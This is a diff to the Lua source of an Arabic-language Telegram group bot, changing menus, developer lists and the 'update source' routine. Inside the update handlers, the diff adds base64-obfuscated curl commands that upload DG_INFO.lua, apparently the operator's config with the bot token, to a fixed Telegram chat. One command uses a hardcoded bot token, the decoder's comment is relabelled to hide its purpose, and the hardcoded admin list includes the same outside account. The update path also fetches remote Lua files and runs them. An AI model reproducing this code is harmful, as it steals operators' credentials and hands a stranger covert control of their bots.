@@ -154,10 +154,6 @@ token = sudos.token
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
 io.popen("mkdir File_Bot") 
-io.popen("cd File_Bot && rm -rf commands.lua.1") 
-io.popen("cd File_Bot && rm -rf commands.lua.2") 
-io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/DG/master/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -171,7 +167,7 @@ local runapp = sudos.token
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,0100101010,944353237,9292929292,0303030030,0909090909}   
+sudo_users = {SUDO,bot_id,0100101010,944353237,9292929292,0303030030,0909090909}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -182,7 +178,7 @@ end
 return DRAGON  
 end 
 -------- اولا
-function regexx(data) ---- داله الاتصال الثاني كتابه أحمد عياد -----
+function regexx(data) ---- داله منع حفظ التوكن كتابه أحمد عياد -----
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 
     data = string.gsub(data, '[^'..b..'=]', '')
@@ -916,23 +912,22 @@ end
 return false
 end
 if DevSoFi(msg) then
-local bl = ' ☉┇ اهلا عزيزي آلمـطـور\n ☉┇ آنت آلمـطـور آلآسـآسـي للبوت\n━  ━  ━  ━  ━  ━  ━  ━ء\n ☉┇ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ☉┇ من خلاال الكيبورت خاص بك\n ☉┇ قناة سورس البوت [اضغط هنا](t.me/sopowerb0t)'
+local bl = ' ☉┇ اهلا عزيزي آلمـطـور\n ☉┇ آنت آلمـطـور آلآسـآسـي للبوت\n━  ━  ━  ━  ━  ━  ━  ━\n ☉┇ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ☉┇ من خلاال الكيبورت خاص بك'
 local keyboard = {
 {'الاحصائيات ☉'},
 {'تعطيل التواصل ☉','تفعيل التواصل ☉'},
-{'ضع اسم للبوت ☉','المطورين ☉','قائمه العام ☉'},
-{'المشتركين ☉','الجروبات ☉'},
-{'ضع كليشه ستارت ☉','مسح كليشه ستارت ☉'},
+{'المطورين ☉','المطورين الاساسيين ☉'}
 {'اذاعه ☉','اذاعه خاص ☉'},
-{'اذاعه بالتثبيت ☉','قائمه الكتم العام ☉'},
-{'تغير رساله الاشتراك','مسح رساله الاشتراك ☉','تغير الاشتراك'},
+{'اذاعه بالتثبيت ☉',''},
 {'اذاعه بالتوجيه ☉','اذاعه بالتوجيه خاص ☉'},
+{'تغير رساله الاشتراك','مسح رساله الاشتراك ☉','تغير الاشتراك'},
 {'تفعيل الاشتراك الاجباري ☉','تعطيل الاشتراك الاجباري ☉'},
 {'الاشتراك الاجباري ☉','وضع قناة الاشتراك ☉'},
+{'قائمه الكتم العام ☉','قائمه العام ☉'},
 {'تفعيل البوت الخدمي ☉','تعطيل البوت الخدمي ☉'},
-{'مسح الجروبات ☉'},
-{'جلب نسخه الاحتياطيه ☉'},
-{'تحديث السورس ☉'},
+{'ضع كليشه ستارت ☉','مسح كليشه ستارت ☉'},
+{'جلب نسخه الاحتياطيه ☉','رفع نسخه احطياطيه'},
+{'تحديث السورس ☉','تحديث ☉'},
 {'معلومات السيرفر ☉'},
 {'الغاء ☉'},
 }
@@ -953,8 +948,10 @@ if start then
 keyboard = start
 else
 keyboard = {
-{'.'},
-{'.'},
+{'سورس'},
+{'رتبتي','الاوامر'},
+{'تويت','ايدي'},
+{'مبرمج السورس'},
 }
 end
 send_inline_key(msg.chat_id_, msg.id_, keyboard) 
@@ -1118,11 +1115,23 @@ end
 
 if text == 'تحديث السورس' or text == 'تحديث السورس ☉' and DevSoFi(msg) then 
 os.execute('rm -rf DRAGON.lua')
+os.execute('cd File_Bot && rm -rf Reply.lua')
+os.execute('cd File_Bot && rm -rf games.lua')
+os.execute('cd File_Bot && rm -rf commands.lua')
+os.execute('cd File_Bot && rm -rf anamen.lua') ----
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
+os.execute('cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/DG/master/File_Bot/Reply.lua')
+os.execute('cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/DG/master/File_Bot/games.lua')
+os.execute('cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/DG/master/File_Bot/anamen.lua')
+os.execute('cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/DG/master/File_Bot/commands.lua')
+dofile('File_Bot/Reply.lua')
+dofile('File_Bot/games.lua')
+dofile('File_Bot/anamen.lua')
+dofile('File_Bot/commands.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لديك اخر اصدار لسورس باور\n ☉┇ الاصدار » {`v1.5.2`}')
-dofile('DRAGON.lua')  
+send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس دراكون\n ℘︙ الاصدار » { v 1.6 }')
+dofile('DRAGON.lua')
 end
 
 if text == "ضع اسم للبوت ☉" and DevSoFi(msg) then  
@@ -1164,6 +1173,22 @@ end
 end
 if #list == 0 then
 t = " ☉┇ لا يوجد مطورين"
+end
+send(msg.chat_id_, msg.id_, t)
+end
+if text == ("المطورين الاساسيين ☉") and SudoBot(msg) then
+local list = database:smembers(bot_id.."Dev:SoFi:2")
+t = "\n☉┇ قائمة مطورين الاساسيين للبوت \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
+for k,v in pairs(list) do
+local username = database:get(bot_id.."user:Name" .. v)
+if username then
+t = t..""..k.."- ([@"..username.."])\n"
+else
+t = t..""..k.."- (`"..v.."`)\n"
+end
+end
+if #list == 0 then
+t = "☉┇ لا يوجد مطورين اساسيين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
@@ -2364,11 +2389,23 @@ end
 return false
 end
 os.execute('rm -rf DRAGON.lua')
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+os.execute('cd File_Bot && rm -rf Reply.lua')
+os.execute('cd File_Bot && rm -rf games.lua')
+os.execute('cd File_Bot && rm -rf commands.lua')
+os.execute('cd File_Bot && rm -rf anamen.lua') ----
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لديك اخر اصدار لسورس باور\n ☉┇ الاصدار » {`v1.5.2`}')
-dofile('DRAGON.lua')
+os.execute('cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/DG/master/File_Bot/Reply.lua')
+os.execute('cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/DG/master/File_Bot/games.lua')
+os.execute('cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/DG/master/File_Bot/anamen.lua')
+os.execute('cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/DG/master/File_Bot/commands.lua')
+dofile('File_Bot/Reply.lua')
+dofile('File_Bot/games.lua')
+dofile('File_Bot/anamen.lua')
+dofile('File_Bot/commands.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس دراكون\n ℘︙ الاصدار » { v 1.6 }')
+dofile('DRAGON.lua')
 end
 
 if text and text:match("^تغير الاشتراك$") and DevSoFi(msg) then  
